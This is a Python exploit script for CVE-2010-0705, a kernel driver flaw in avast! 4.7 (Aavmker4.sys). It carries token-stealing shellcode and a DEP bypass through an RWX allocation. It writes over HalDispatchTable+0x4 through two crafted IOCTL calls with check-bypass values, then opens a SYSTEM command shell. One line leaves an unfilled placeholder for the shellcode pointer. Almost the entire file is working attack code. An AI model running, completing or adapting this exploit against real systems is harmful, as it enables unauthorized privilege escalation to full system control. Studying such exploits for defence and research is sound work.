# CVE-2010-0705 avast! 4.7 'Aavmker4.sys' Kernel Exploit
# Author: Connor McGarr

import os, sys, struct
from ctypes import *
from subprocess import *

# DLLs for Windows API interaction
kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi
IOCTL_VULNERABLE = 0xb2d60030

# Token stealing payload
payload = bytearray(
    "\x90\x90\x90\x90"                # NOP sled
    "\x60"                            # pushad
    "\x31\xc0"                        # xor eax,eax
    "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
    "\x8b\x40\x50"                    # mov eax,[eax+0x50]
    "\x89\xc1"                        # mov ecx,eax
    "\xba\x04\x00\x00\x00"            # mov edx,0x4
    "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
    "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
    "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
    "\x75\xed"                        # jnz 0x1a
    "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
    "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
    "\x61"                            # popad
    "\x31\xc0"                        # xor eax, eax (restore execution)
    "\x83\xc4\x24"                    # add esp, 0x24 (restore execution)
    "\x5d"                            # pop ebp
    "\xc2\x08\x00"                    # ret 0x8
)

# Defeating DEP with VirtualAlloc. Creating RWX memory, and copying our shellcode in that region.
print "[+] Allocating RWX region for shellcode"
ptr = kernel32.VirtualAlloc(
    c_int(0),                         # lpAddress
    c_int(len(payload)),              # dwSize
    c_int(0x3000),                    # flAllocationType
    c_int(0x40)                       # flProtect
)

# Creates a ctype variant of the payload (from_buffer)
c_type_buffer = (c_char * len(payload)).from_buffer(payload)

print "[+] Copying shellcode to newly allocated RWX region"
kernel32.RtlMoveMemory(
    c_int(ptr),                       # Destination (pointer)
    c_type_buffer,                    # Source (pointer)
    c_int(len(payload))               # Length
)

# Python, when using id to return a value, creates an offset of 20 bytes ot the value (first bytes reference variable)
# After id returns the value, it is then necessary to increase the returned value 20 bytes
payload_address = id(payload) + 20
payload_updated = struct.pack("<L", ptr)
payload_final = id(payload_updated) + 20

# Location of shellcode update statement
print "[+] Location of shellcode: {0}".format(hex(payload_address))

# Location of pointer to shellcode
print "[+] Location of pointer to shellcode: {0}".format(hex(payload_final))






# Enumerating addresses for all drivers via EnumDeviceDrivers()
base = (c_ulong * 1024)()
get_drivers = psapi.EnumDeviceDrivers(
    byref(base),                      # lpImageBase (array that receives list of addresses)
    c_int(1024),                      # cb (size of lpImageBase array, in bytes)
    byref(c_long())                   # lpcbNeeded (bytes returned in the array)
)

# Error handling if function fails
if not base:
    print "[+] Call to EnumDeviceDrivers() failed!"
    sys.exit(-1)

# Cycling through enumerated addresses, and looking for aavmker4.sys using GetDeviceDriverBaseNameA()
for base_address in base:
    if not base_address:
        continue
    current_name = c_char_p("\x00" * 1024)
    driver_name = psapi.GetDeviceDriverBaseNameA(
        base_address,                 # ImageBase (load address of current device driver)
        current_name,                 # lpFilename
        48                            # nSize (size of the buffer, in chars)
    )

    # Error handling if GetDeviceDriverBaseNameA() fails
    if not driver_name:
        print "[+] Call to GetDeviceDriverBaseNameA() failed!"
        sys.exit(-1)

    if current_name.value.lower() == 'aavmker4' or 'aavmker4' in current_name.value.lower():

        # When aavmker4.sys is found, return the value at the time of being found
        current_name = current_name.value

        # Print update to show base address of aavmker4.sys
        print "[+] Found address of aavmker4.sys @: {0}".format(hex(base_address))

        # Break for loop since address has been found if this instruction is reached
        break

# The technique we are using will be to write our shellcode @ HAL + 0x4
# HAL is exported by ntkrnl.exe
# We will use the same technique to enumerate the base address of ntkrnl.exe
# We will change variable names to not interfere with the above enumeration of aavmker4.sys base address
begin = (c_ulong * 1024)()
enum_drivers = psapi.EnumDeviceDrivers(
    byref(begin),                     # lpImageBase (array that receives list of addresses)
    c_int(1024),                      # cb (size of lpImageBase array, in bytes)
    byref(c_long())                   # lpcbNeeded (bytes returned in the array)
)

# Error handling if function fails
if not begin:
    print "[+] EnumDeviceDrivers() function call failed!"
    sys.exit(-1)

# Cycle through enumerated addresses, for ntkrnl.exe using GetDeviceDriverBaseNameA()
for second_base_address in begin:
    if not second_base_address:
        continue
    curr_name = c_char_p('\x00' * 1024)
    drv_name = psapi.GetDeviceDriverBaseNameA(
        second_base_address,    # ImageBase (load address of current device driver)
        curr_name,              # lpFilename
        48                      # nSize (size of the buffer, in chars)
    )

    # Error handling if function fails
    if not drv_name:
        print "[+] GetDeviceDriverBaseNameA() function call failed!"
        sys.exit(-1)

    if curr_name.value.lower() == 'ntkrnl' or 'ntkrnl' in curr_name.value.lower():

        # When ntkrnl.exe is found, return the value at the time of being found
        curr_name = curr_name.value

        # Print update to show address of ntkrnl.exe
        print "[+] Found address of ntkrnl.exe @: {0}".format(hex(second_base_address))

        # It assumed the information needed from the for loop has been found if the program has reached execution at this point.
        # Stopping the for loop to move on.
        break

# Now that ntkrnl.exe base address has been found, it is time to extract HAL's location, as well as HAL + 0x4
# Beginning enumeration
kernel_handle = kernel32.LoadLibraryExA(
    curr_name,                          # lpLibFileName (specifies the name of the module, in this case ntlkrnl.exe)
    None,                               # hFile (parameter must be null
    0x00000001                          # dwFlags (DONT_RESOLVE_DLL_REFERENCES)
)

# Error handling if function fails
if not kernel_handle:
    print "[+] LoadLibraryExA() function failed!"
    sys.exit(-1)

# Getting HAL Address
hal = kernel32.GetProcAddress(
    kernel_handle,                      # hModule (handle passed via LoadLibraryExA to ntkrnl.exe)
    'HalDispatchTable'                  # lpProcName (name of value)
)

# Subtracting ntkrnl base in user land
hal -= kernel_handle

# Add base address of ntkrnl in kernel land
hal += second_base_address

# Recall earlier we were more interested in HAL + 0x4. Let's grab that address.
real_hal = hal + 0x4

# Print update with HAL and HAL + 0x4 location
print "[+] Hardware abstraction layer located @: {0}".format(hex(hal))
print "[+] HAL + 0x4 located @ : {0}".format(hex(real_hal))

# When the buffer is stored in kernel land, it will be stored at an offset of aavmker4.sys + 0x2e00
# We know this, because we enumerated the base address of aavmker4.sys with the above function(s)
# And subtracted the two values.
# Calculating address where storage occurs in kernel land
stored_data = struct.pack('L', (base_address+0x2e00))

# 0x878 - length needed for final vulnerable IOCTL that kicks off the exploit
crash_length = 0x878

# 2 driver checks:
# cmp dword ptr [eax],0D0DEAD07h
# cmp dword ptr [eax+4],10BAD0BAh
# Checks are back to back, in terms of offset to each other ([eax] and [eax+4])
# Creating a double DWORD user land to bypass these checks
bypass_checks = struct.pack("<L", 0x0D0DEAD07)
bypass_checks += struct.pack("<L", 0x10BAD0BA)

# 8 bytes are taken up with the double DWORD.
# Our arbitrary overwrite happens at an offset of this whole buffer + 0x18
# Adding 0x10 bytes of padding (0x18-0x8) to reach the offset.
bypass_checks += "\x43" * 0x10

# HAL + 0x4 address
bypass_checks += struct.pack('L', real_hal)

# 0x418 is the amount of data accepted by second IOCTL initially.
# Subtracting 0x8 here, to account for double DWORD that bypasses driver checks
# Subtracting 0x10 here to compensate for 0x10 byte pad
# Subtracting 0x4 here to compensate of HAL + 0x4 address (DWORD size)
# Creating a different variable here, so bypass_checks_can be included in evil_buffer first
bypass_checks += "\x43" * (0x418 - 0x8 - 0x10 - 0x4)

# mov eax, [esi+0x870]
# ESI stores the buffer originally, and then the pointer is extracted and put into EAX
# The memory that is moved into EAX is located at ESI+0x870
# This means, since our buffer is in ESI now, we should put 0x870 bytes of padding- to compensate
# Adding a 4 byte pad, since our buffer needs to be a total of 0x878 bytes

# Our buffer is being written to HAL + 0x4, based on the above enumeration of our arbitrary overwrite of kernel memory.
# This buffer, when at the locatino of HAL + 0x4, will be at an offset of this buffer + 0x4.
# POC to load 42424242 at location of HAL + 0x4
evil_buffer = "\x41" * 0x4


evil_buffer += POINTER_TO_SHELLCODE_NEEDS_TO_GO_HERE


evil_buffer += "\x41" * (0x870 - len(evil_buffer))
evil_buffer += stored_data

# Enumerating a handle to vulnerable driver to be passed to DeviceIoControl()
print "[+] Utilizing CreateFileA() to get handle to AavmKer4.sys..."

handle = kernel32.CreateFileA(
    "\\\\.\\AavmKer4",                  # lpFileName
    0xC0000000,                         # dwDesiredAccess
    0,                                  # dwShareMode
    None,                               # lpSecurityAttributes
    0x3,                                # dwCreationDisposition
    0,                                  # dwFlagsAndAttributes
    None                                # hTemplateFile
)

# 0xb2d6001c = IOCTL code that will store a buffer at an arbitrary kernel land address
print "[+] Storing kernel land buffer..."

kernel32.DeviceIoControl(
    handle,                             # hDevice
    0xb2d6001c,                         # dwIoControlCode
    bypass_checks,                      # lpInBuffer
    0x418,                              # nInBufferSize
    "",                                 # lpOutBuffer
    0x1024,                             # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# 0xb2d60030 = IOCTL code that will trigger the vulnerability
print "[+] Interacting with the driver..."

kernel32.DeviceIoControl(
    handle,                             # hDevice
    IOCTL_VULNERABLE,                   # dwIoControlCode
    evil_buffer,                        # lpInBuffer
    crash_length,                       # nInBufferSize
    "",                                 # lpOutBuffer
    0x1024,                             # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Print update for nt_autority\system shell
print "[+] Enjoy the NT_AUTHORITRY\SYSTEM shell!!!!"
Popen("start cmd", shell=True)
